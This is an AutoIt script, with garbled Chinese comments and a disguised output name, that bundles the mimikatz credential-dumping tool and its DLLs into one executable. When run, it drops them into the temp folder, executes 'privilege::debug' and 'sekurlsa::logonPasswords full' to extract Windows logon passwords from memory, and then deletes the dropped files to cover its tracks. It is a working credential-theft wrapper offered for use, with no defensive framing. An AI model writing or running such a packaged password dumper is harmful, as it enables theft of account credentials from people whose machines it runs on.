#Region ;**** ���������� ACNWrapper_GUI ****
#PRE_Icon=L:\����\QQ\3D���ICOͼ��\media-players.ico
#PRE_Outfile=C:\Users\chtyfox\Desktop\Win32\Сվ����ϵͳ�����ȡ����.exe
#PRE_Compression=4
#PRE_Res_Comment=Сվ����ϵͳ�����ȡ����
#PRE_Res_Description=Сվ����ϵͳ�����ȡ����
#PRE_Res_Fileversion=1.0.0.2
#PRE_Res_Fileversion_AutoIncrement=p
#PRE_Res_LegalCopyright=Сվ����ϵͳ�����ȡ����
#PRE_Res_requestedExecutionLevel=None
#EndRegion ;**** ���������� ACNWrapper_GUI ****
#Region ACNԤ����������(���ò���)
;#PRE_Res_Field=AutoIt Version|%AutoItVer%		;�Զ�����Դ��
;#PRE_Run_Tidy=                   				;�ű�����
;#PRE_Run_Obfuscator=      						;�����Ի�
;#PRE_Run_AU3Check= 							;�﷨���
;#PRE_Run_Before= 								;����ǰ
;#PRE_Run_After=								;���к�
;#PRE_UseX64=n									;ʹ��64λ������
;#PRE_Compile_Both								;����˫ƽ̨����
#EndRegion ACNԤ�����������������
#cs �ߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣ�

 Au3 �汾: 
 �ű�����: 
 �����ʼ�: 
	QQ/TM: 
 �ű��汾: 
 �ű�����: 

#ce �ߣߣߣߣߣߣߣߣߣߣߣߣߣߣ߽ű���ʼ�ߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣߣ�

FileInstall("C:\Users\chtyfox\Desktop\Win32\kappfree.dll", @TempDir & "\kappfree.dll")
FileInstall("C:\Users\chtyfox\Desktop\Win32\kelloworld.dll", @TempDir & "\kelloworld.dll")
FileInstall("C:\Users\chtyfox\Desktop\Win32\klock.dll", @TempDir & "\klock.dll")
FileInstall("C:\Users\chtyfox\Desktop\Win32\mimikatz.exe", @TempDir & "\mimikatz.exe")
FileInstall("C:\Users\chtyfox\Desktop\Win32\mimikatz.sys", @TempDir & "\mimikatz.sys")
FileInstall("C:\Users\chtyfox\Desktop\Win32\sekurlsa.dll", @TempDir & "\sekurlsa.dll")

If FileExists(@ScriptDir & "\mimikatz.exe") Then
    ;MsgBox(4096, "C:\mimikatz.exe �ļ�", "C:\mimikatz.exe �ļ�����")
	DQ()
Else
    ;MsgBox(4096,"C:\mimikatz.exe �ļ�", "mimikatz.exe �ļ�������")
	LS()
EndIf

Func DQ()
RunWait(@ComSpec & ' /c ' & @ScriptDir & '\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full"', '', @SW_SHOW)
EndFunc

Func LS()
RunWait(@ComSpec & ' /c ' & @TempDir & '\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full"', '', @SW_SHOW)
EndFunc


FileDelete(@TempDir & "\kappfree.dll")
FileDelete(@TempDir & "\kelloworld.dll")
FileDelete(@TempDir & "\klock.dll")
FileDelete(@TempDir & "\mimikatz.exe")
FileDelete(@TempDir & "\mimikatz.sys")
FileDelete(@TempDir & "\sekurlsa.dll")
